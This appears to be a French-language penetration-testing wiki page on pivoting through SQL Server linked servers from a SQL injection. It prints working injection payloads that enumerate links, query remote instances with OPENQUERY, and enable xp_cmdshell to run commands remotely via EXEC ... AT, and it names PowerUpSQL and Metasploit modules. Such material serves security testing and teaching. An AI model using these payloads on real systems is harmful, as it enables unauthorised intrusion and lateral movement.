---
order: 10
title: "Pivoter à travers les serveurs liés de SQL Server"
description: "Abuser des serveurs liés de SQL Server depuis une injection : énumérer les liens, exécuter des requêtes et des commandes sur des instances distantes avec openquery et RPC, et chaîner les liens."
keywords:
  - serveurs liés
  - openquery
  - RPC out
  - EXECUTE AT
  - mouvement latéral
---

# Liens de confiance

Les serveurs liés permettent à un SQL Server d'exécuter des requêtes sur un autre, souvent sous un login configuré qui est plus privilégié côté distant. Une injection sur une instance peut donc pivoter vers d'autres, obtenant parfois `sysadmin` sur une cible où le login local n'en dispose pas.

Énumérez les liens configurés :

```sql
' UNION SELECT srvname,NULL,NULL FROM master..sysservers-- 
```

Exécutez une requête sur un lien avec `OPENQUERY`, ce qui révèle le contexte distant :

```sql
' UNION SELECT * FROM OPENQUERY([REMOTE],'SELECT @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')')-- 
```

Si le lien est configuré pour s'exécuter sous un login distant privilégié, l'exécution de commandes sur la cible distante s'ensuit. Les liens pour lesquels RPC Out est activé acceptent `EXEC ... AT`, qui exécute une instruction arbitraire à distance :

```sql
'; EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [REMOTE]-- 
```

Les liens peuvent être chaînés : un `OPENQUERY` imbriqué sur plusieurs sauts atteint des instances non directement liées au point d'entrée, et le privilège effectif à chaque saut est celui que détient le login configuré de ce lien. Cela fait de l'abus des serveurs liés une voie de mouvement latéral de premier plan dans les parcs SQL Server, indépendamment du fait que le login de l'instance d'entrée soit lui-même privilégié.

## Outils

- **PowerUpSQL** : `Get-SQLServerLinkCrawl` pour énumérer et pivoter à travers les serveurs liés.
- **Metasploit Framework** : module `mssql_linkcrawler` pour l'exécution de commandes via serveurs liés.
- **sqlcmd** : client officiel pour exécuter `OPENQUERY` et `EXEC ... AT` à la main.

## Références

- Microsoft SQL Server Documentation: linked servers, OPENQUERY, sp_serveroption (RPC Out)
- OWASP Testing Guide: Testing for SQL Injection
